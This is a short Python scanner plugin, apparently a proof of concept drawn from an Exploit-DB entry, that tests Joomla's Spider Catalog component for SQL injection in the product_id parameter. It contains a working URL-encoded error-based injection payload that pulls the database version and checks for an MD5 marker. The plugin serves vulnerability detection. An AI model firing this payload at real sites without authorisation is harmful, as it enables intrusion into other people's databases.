#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : Joomla Spider Catalog (index.php, product_id parameter) SQL Injection Vulnerability
From : http://www.exploit-db.com/exploits/22403/
"""
def assign(service, arg):
    if service == "joomla":
        return True, arg

def audit(arg):
    payload = "index.php?option=com_spidercatalog&product_id=-1%27%20or%201%3d1%2b%28select%201%20and%20row%281%2c1%29%3E%28select%20count%28*%29%2cconcat%28CONCAT%28version%28%29,0x3D,MD5(3.14),0x3D,0x3D,0x3D%29%2c1111%2cfloor%28rand%28%29*2%29%29x%20from%20%28select%201%20union%20select%202%29a%20group%20by%20x%20limit%201%29%29%2b%27&view=showproduct&page_num=1&back=1"
    target_url=arg + payload
    code, head, res, _, _ = curl.curl("%s" % target_url)
    if code==200 and '4beed3b9c4a886067de0e3a094246f78' in res :
        security_hole(target_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla', 'http://www.example.com/')[1])